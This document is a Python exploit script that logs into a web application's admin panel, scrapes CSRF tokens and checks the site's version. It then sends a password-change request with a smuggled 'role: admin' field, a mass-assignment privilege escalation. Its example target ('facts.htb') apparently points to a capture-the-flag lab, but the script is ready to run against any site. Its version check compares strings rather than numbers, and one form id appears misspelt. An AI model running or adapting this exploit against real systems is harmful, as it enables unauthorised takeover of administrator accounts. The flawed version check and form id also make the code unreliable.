#!/usr/bin/env python3
"""
Usage:
    python3 exp.py http://target.example user password123
"""

import sys
from urllib.parse import urljoin
import re
import requests
from bs4 import BeautifulSoup

def parse_version(text):   
    pattern = r'(?i)version\s*([\d.]+(?:\.\d+)*)'
    
    m = re.search(pattern, text)
    if m:
        ver_str = m.group(1).strip()
        parts = ver_str.split('.')
        cleaned_parts = [str(int(p)) for p in parts if p.strip()]
        return '.'.join(cleaned_parts) if cleaned_parts else None
    return None

def main():
    if len(sys.argv) != 4:
        print(f"Usage: {sys.argv[0]} <base_url> <username> <password>")
        print("Example:")
        print(f"  {sys.argv[0]} http://facts.htb john Password123!")
        sys.exit(1)

    base_url = sys.argv[1].rstrip('/')
    username = sys.argv[2]
    password = sys.argv[3]

    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0",
        "X-Requested-With": "XMLHttpRequest",
    })

    # 1. Get login page
    login_url = urljoin(base_url, "/admin/login")

    try:
        r = session.get(login_url, timeout=8)
        r.raise_for_status()
    except Exception as e:
        print(f"[!] Cannot reach login page: {e}")
        sys.exit(2)

    soup = BeautifulSoup(r.text, "html.parser")

    # Find authenticity_token
    token_input = soup.find("input", {"name": "authenticity_token"})
    if token_input and token_input.get("value"):
        login_token = token_input["value"]
    else:
        token_input = soup.find("input", {"name": re.compile(r"(csrf|authenticity)_token", re.I)})
        login_token = token_input["value"] if token_input and token_input.get("value") else None

    # 2. Login payload
    login_data = {
        "user[username]": username,
        "user[password]": password,
    }
    if login_token:
        login_data["authenticity_token"] = login_token

    print(f"[*] Logging in as {username} ...")

    resp = session.post(login_url, data=login_data, allow_redirects=True)

    if "sign in" in resp.text.lower() or "log in" in resp.text.lower():
        print("[!] Login appears to have failed - still seeing login form")
        sys.exit(3)

    if resp.url == login_url and not resp.history:
        print("[!] No redirect after login POST - probably failed")
        sys.exit(3)

    print("[+] Login successful")
    
    # 3. Get profile page
    profile_url = urljoin(base_url, "/admin/profile/edit")
    r = session.get(profile_url)
    if r.status_code != 200:
        print(f"[!] GET {profile_url} failed with status {r.status_code}")
        sys.exit(4)
    print("[+] Got profile page")
    soup = BeautifulSoup(r.text, "html.parser")
    
    # 4. Check version
    footer = soup.find("footer", id="main-footer")
    if not footer:
        print("[!] Could not find footer with id='main-footer'")
    else:

        pull_right = footer.find("div", class_="pull-right")
        if pull_right:
            version_text = pull_right.get_text(strip=True)
            ver_str = parse_version(version_text)
            if ver_str:
                if ver_str >= "2.9.1":
                    print(f"[i] Version detected: {ver_str} (> 2.9.1) - this exploit will not work")
                    sys.exit(3)
                else:
                    print(f"[i] Version detected: {ver_str} (< 2.9.1) - appears to be vulnerable version")

            else:
                print("[!] No version number found in pull-right div")
        else:
            print("[!] No div.pull-right found in footer")

    # 5. Get password change form
    form = soup.find("form", id="profie-form-ajax-password")
    if not form:
        print("[!] No <form> with id profile-form-ajax-password element found on profile edit page")
        sys.exit(5)

    token_input = form.find("input", {"name": "authenticity_token"})
    if not token_input or not token_input.get("value"):
        print("[!] No authenticity_token found in edit profile form")
        sys.exit(5)

    auth_token = token_input["value"]
    print(f"[+] authenticity_token: {auth_token}")
    
    # 6. Exploit
    update_data = {
        "_method": "patch",
        "authenticity_token": auth_token,
        "password[password]": password,
        "password[password_confirmation]": password,
        "password[role]": "admin"
    }

    action = form.get("action")
    submit_url = urljoin(base_url, action)
    method = form.get("method", "post").lower()
    
    print(submit_url)

    print(f"[*] Submitting password change request")

    if method == "post":
        resp = session.post(submit_url, data=update_data)
    else:
        resp = session.request(method.upper(), submit_url, data=update_data)

    if resp.status_code in (200, 302):
        print("[+] Submit successful, you should be admin")

    else:
        print(f"[!] Submit failed with status {resp.status_code}")
        print("Response preview (first 300 chars):")
        print(resp.text[:300])


if __name__ == "__main__":
    main()
